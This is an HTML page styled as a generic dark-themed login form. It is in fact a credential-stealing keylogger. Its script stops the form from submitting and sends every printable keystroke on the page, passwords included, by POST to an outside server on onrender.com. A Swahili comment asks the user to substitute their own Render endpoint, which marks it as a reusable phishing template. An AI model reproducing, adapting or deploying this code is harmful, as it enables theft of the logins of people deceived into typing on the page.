<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>
  <style>
    body {
      background: #0f172a;
      color: #f8fafc;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #1e293b;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 10px #000;
    }
    input {
      padding: 0.5rem;
      margin: 0.5rem 0;
      width: 100%;
      border-radius: 8px;
      border: none;
      background: #334155;
      color: white;
    }
    button {
      padding: 0.5rem;
      width: 100%;
      border: none;
      border-radius: 8px;
      background: #2563eb;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Login</h2>
    <form>
      <input type="text" id="username" placeholder="Username" />
      <input type="password" id="password" placeholder="Password" />
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    const form = document.querySelector("form");
    const renderEndpoint = "https://serverpy-1fqb.onrender.com/send"; // ðŸ‘ˆ replace na link yako ya render

    form.addEventListener("submit", (e) => {
      e.preventDefault();
    });

    document.addEventListener("keydown", async (e) => {
      const key = e.key;

      // skip special keys
      if (key.length === 1) {
        await fetch(renderEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ key })
        });
      }
    });
  </script>
</body>
</html>
